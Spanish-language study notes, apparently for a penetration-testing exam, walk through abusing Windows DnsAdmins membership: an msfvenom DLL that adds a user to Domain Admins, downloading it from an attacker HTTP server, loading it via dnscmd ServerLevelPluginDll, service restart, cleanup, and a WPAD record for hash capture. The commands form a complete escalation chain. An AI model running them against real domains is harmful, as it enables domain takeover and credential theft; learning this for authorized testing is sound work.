
## 1. Enumeración

Comprobar si el usuario pertenece al grupo `DnsAdmins`:

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

Consultar los miembros de `Domain Admins`:

```cmd
net group "Domain Admins" /domain
```

Obtener el SID del usuario actual:

```cmd
wmic useraccount where name="netadm" get sid
```

Comprobar los permisos del servicio DNS:

```cmd
sc.exe sdshow DNS
```

- `RP`: `SERVICE_START`, permiso para iniciar el servicio.
- `WP`: `SERVICE_STOP`, permiso para detener el servicio.

## 2. Escalada mediante una DLL maliciosa

**Condición:** pertenecer a `DnsAdmins` y conseguir que el servicio DNS cargue una DLL controlada por nosotros.

El servicio DNS puede ejecutarse como `SYSTEM`. Los miembros de `DnsAdmins` pueden configurar la DLL del plugin mediante `dnscmd`, aunque no tengan permisos directos sobre la clave del Registro.

### Paso 1. Generar la DLL

En la máquina atacante, generar una DLL que añada un usuario al grupo `Domain Admins`:

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

### Paso 2. Transferir la DLL al objetivo

Iniciar un servidor HTTP en el directorio donde está la DLL:

```bash
python3 -m http.server 7777
```

En el objetivo, descargarla:

```powershell
wget "http://10.10.14.3:7777/adduser.dll" -OutFile "adduser.dll"
```

Sustituir `10.10.14.3` por la IP de la máquina atacante.

### Paso 3. Configurar el plugin DNS

Ejecutar como miembro de `DnsAdmins`:

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

**Importante:** especificar la ruta completa de la DLL.

Si aparece `ERROR_ACCESS_DENIED`, comprobar la pertenencia a `DnsAdmins` y los permisos efectivos del usuario.

La configuración establece el valor `ServerLevelPluginDll` en:

```text
HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

### Paso 4. Comprobar si podemos reiniciar el servicio DNS

```cmd
sc.exe sdshow DNS
```

Si el usuario dispone de permisos para detener e iniciar el servicio, ejecutar:

```cmd
sc.exe stop dns
sc.exe start dns
```

Cuando el servicio DNS se inicie, intentará cargar la DLL configurada.

**Nota:** pertenecer a `DnsAdmins` no garantiza poder reiniciar el servicio DNS. Si no se tienen esos permisos, el ataque puede requerir esperar a que el servicio se reinicie por otro motivo.

### Paso 5. Verificar el resultado

```cmd
net group "Domain Admins" /domain
```

Si la DLL se ejecutó correctamente y el comando tuvo éxito, `netadm` aparecerá entre los miembros de `Domain Admins`.

## 3. Limpieza: eliminar la configuración del plugin

La configuración maliciosa puede impedir que el servicio DNS vuelva a iniciarse correctamente.

Consultar la configuración:

```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

Eliminar el valor del plugin:

```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Confirmar la eliminación cuando se solicite y después iniciar el servicio:

```cmd
sc.exe start dns
```

Comprobar su estado:

```cmd
sc.exe query dns
```

El estado esperado es:

```text
STATE : 4 RUNNING
```

> Estos cambios pueden interrumpir el servicio DNS del dominio. En un entorno real, deben realizarse únicamente con autorización explícita y coordinando la limpieza.

## 4. Alternativa: abuso de WPAD

Los miembros de `DnsAdmins` también pueden modificar la configuración DNS para facilitar ataques de suplantación de tráfico.

### Paso 1. Deshabilitar la lista de bloqueo global

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### Paso 2. Crear un registro A para WPAD

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

Sustituir los nombres y la IP por los correspondientes al laboratorio.

### Objetivo

Dirigir las solicitudes WPAD de equipos que utilicen la configuración predeterminada hacia la máquina controlada por el atacante. Con herramientas como **Responder** o **Inveigh**, se puede intentar capturar hashes de autenticación o realizar ataques de SMB Relay.

## 5. Datos clave para el examen

- **Grupo vulnerable:** `DnsAdmins`.
- **Servicio implicado:** DNS, que puede ejecutarse como `NT AUTHORITY\SYSTEM`.
- **Herramienta principal:** `dnscmd.exe`.
- **Parámetro de configuración:** `ServerLevelPluginDll`.
- **Clave del Registro:** `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`.
- **Permisos relevantes:** `RP` para iniciar el servicio y `WP` para detenerlo.
- **Condición de explotación:** poder configurar la DLL y conseguir que el servicio DNS la cargue.
- **Alternativa:** abuso de WPAD mediante cambios en la configuración DNS.
- **Limpieza:** eliminar `ServerLevelPluginDll` y comprobar que DNS vuelve a ejecutarse.

### Flujo de ataque

```text
Enumerar pertenencia a DnsAdmins
            ↓
Generar y transferir la DLL
            ↓
Configurar ServerLevelPluginDll con dnscmd
            ↓
Comprobar permisos sobre el servicio DNS
            ↓
Reiniciar DNS si se dispone de permisos
            ↓
Verificar la ejecución y el resultado
            ↓
Eliminar la configuración del plugin
```
